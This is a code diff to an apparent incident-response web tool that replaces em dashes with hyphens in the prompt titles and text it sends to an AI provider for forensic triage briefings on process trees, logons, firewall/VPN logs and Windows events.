-  if(mode==="proc") return { title:"Process ancestry — read", maxTokens:2600,
+  if(mode==="proc") return { title:"Process ancestry - read", maxTokens:2600,
     system:aiStruct(["Bottom line","Suspicious execution chains","LOLBIN / abnormal parent-child use","Likely malicious commands","Next checks","Open questions to answer"]),
     prompt:"Process-tree data:\n\n"+(await aiProcText())+"\n\nWrite the process-ancestry briefing." };
-  if(mode==="sess") return { title:"Logon sessions — read", maxTokens:2400,
+  if(mode==="sess") return { title:"Logon sessions - read", maxTokens:2400,
     system:aiStruct(["Bottom line","Suspicious / external logons","RDP & remote access exposure","Accounts of concern","Next checks","Open questions to answer"]),
     prompt:"Logon-session data:\n\n"+(await aiSessText())+"\n\nWrite the logon-session briefing." };
-  if(mode==="ev") return { title:"Evidence — interpretation", maxTokens:2800,
+  if(mode==="ev") return { title:"Evidence - interpretation", maxTokens:2800,
     system:aiStruct(["Bottom line","Persistence mechanisms","Credential access","Anti-forensics","Suspicious execution","Priorities","Open questions to answer"]),
     prompt:"Extracted forensic evidence:\n\n"+(await aiEvidenceText())+"\n\nWrite the evidence interpretation." };
   if(mode==="cw") return { title:"Draft case summary", canInsert:true, maxTokens:1400,
     system:"You are a senior DFIR analyst. Write a clear, substantive incident summary (a solid paragraph, ~6-9 sentences, plain prose, no headers) for a case report: what happened, scope (named hosts/users), key evidence, and an assessment with severity. Only use the data provided; never invent values.",
     prompt:"Case data:\n\n"+(await gatherCaseContext())+"\n\nWrite the incident summary." };
-  if(mode==="timeline") return { title:"Timeline — chronology read", maxTokens:2600,
+  if(mode==="timeline") return { title:"Timeline - chronology read", maxTokens:2600,
     system:aiStruct(["Bottom line","Likely sequence of events","Notable time clusters / spikes","What to zoom into first","Open questions to answer"]),
     prompt:"Case triage data (chronological view):\n\n"+(await gatherCaseContext())+"\n\nWrite the timeline / chronology briefing." };
   if(mode==="fw"||mode==="vpn"){ const kind=mode==="fw"?"firewall":"VPN"; let d="";
     try{ const j=await (await api("/api/cat",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cat:mode})})).json();
       if(j&&j.rows&&j.rows.length) d=kind+" log lines ("+j.rows.length+" shown):\n"+j.rows.slice(0,60).map(r=>(r.ts||"")+" "+(r.src||"")+" "+(r.msg||"").slice(0,140)).join("\n"); }catch(_){}
     if(!d) d="No "+kind+" log lines loaded (add a "+kind+" log in the "+(mode==="fw"?"🔥 Firewall":"🔒 VPN")+" tab).";
-    return { title:kind.toUpperCase()+" — network read", maxTokens:2400,
+    return { title:kind.toUpperCase()+" - network read", maxTokens:2400,
       system:aiStruct(["Bottom line","Suspicious connections / sources","Blocked vs allowed patterns","Indicators to pivot on","Recommended checks","Open questions to answer"]),
       prompt:kind+" data:\n\n"+d+"\n\nWrite the network-log briefing." }; }
   // dash / events / default → full case-wide DFIR briefing
   return { title:"Case DFIR briefing", canInsert:true, maxTokens:5000,
     system:aiStruct(["Summary","What happened (narrative / timeline)","Initial access & execution","Persistence, credential access & lateral movement","Scope (affected hosts & accounts)","Impact & exfiltration risk","Key indicators","Assessment (severity & confidence)","Recommended next actions (prioritised)","DFIR questions to answer"])+
-      " IMPORTANT: keep each section to 2-4 tight bullets so the WHOLE briefing (all 10 sections) fits — do not run out of space before the final sections. Never stop mid-section.",
-    prompt:"Triage data for the whole case:\n\n"+(await gatherCaseContext())+"\n\nWrite the full DFIR triage briefing — cover every section through to \"DFIR questions to answer\"." };
+      " IMPORTANT: keep each section to 2-4 tight bullets so the WHOLE briefing (all 10 sections) fits - do not run out of space before the final sections. Never stop mid-section.",
+    prompt:"Triage data for the whole case:\n\n"+(await gatherCaseContext())+"\n\nWrite the full DFIR triage briefing - cover every section through to \"DFIR questions to answer\"." };
 }
 /* --- panel --- */
 function aiSetTitle(t){ $("aiPanelTitle").textContent="✦ "+t; }
@@ -8278,7 +8279,7 @@ function aiPanelLoading(){ aiShowPanel(); const b=$("aiPanelBody"); b.classList.
 function aiPanelErr(m, offerSettings){ aiShowPanel(); const b=$("aiPanelBody"); b.classList.add("err"); b.textContent=m; $("aiPanelProv").textContent=""; $("aiPanelFoot").innerHTML=offerSettings?'<button class="vbtn" id="aiOpenSettings">⚙ Open Settings</button>':""; }
 async function aiSupport(mode){
   mode=mode||document.body.getAttribute("data-mode")||"dash";
-  if(!SERVER){ aiPanelErr("AI Support runs server-side — run the backend to use it."); return; }
+  if(!SERVER){ aiPanelErr("AI Support runs server-side - run the backend to use it."); return; }
   await ensureAISettings();
   if(!aiConfigured()){ aiPanelErr("No AI model configured yet. Open ⚙ Settings, choose Claude / ChatGPT / Gemini and add a key.", true); return; }
   aiPanelLoading();
@@ -8314,9 +8315,9 @@ async function analyzeEvent(){
   if(!aiConfigured()){ box.classList.add("err"); lbl.textContent="AI Support";
     body.innerHTML="No AI model configured. Open ⚙ Settings, pick Claude / ChatGPT / Gemini and add a key."; return; }
   lbl.innerHTML='<span class="spin"></span> &nbsp;analyzing…'; body.textContent="";
-  const sys="You are a senior SOC/DFIR analyst. Explain ONE Windows event-log record in plain English: what happened; what this provider + Event ID means; the key fields present; whether routine or potentially suspicious and WHY; and one or two concrete next checks. Under ~150 words. Only reference fields actually present — never invent values.";
+  const sys="You are a senior SOC/DFIR analyst. Explain ONE Windows event-log record in plain English: what happened; what this provider + Event ID means; the key fields present; whether routine or potentially suspicious and WHY; and one or two concrete next checks. Under ~150 words. Only reference fields actually present - never invent values.";
   const r=await callAI(sys, "Explain this Windows event-log record:\n\n"+modalJSON, 550);
-  if(!r.ok){ box.classList.add("err"); lbl.textContent="AI Support — failed"; body.textContent=r.error||"request failed"; return; }
+  if(!r.ok){ box.classList.add("err"); lbl.textContent="AI Support - failed"; body.textContent=r.error||"request failed"; return; }
   lbl.textContent="AI Support · "+(r.label||r.provider||"")+(r.model?" "+r.model:""); body.innerHTML=r.text?mdLite(r.text):"(empty response)";
 }
 </script>
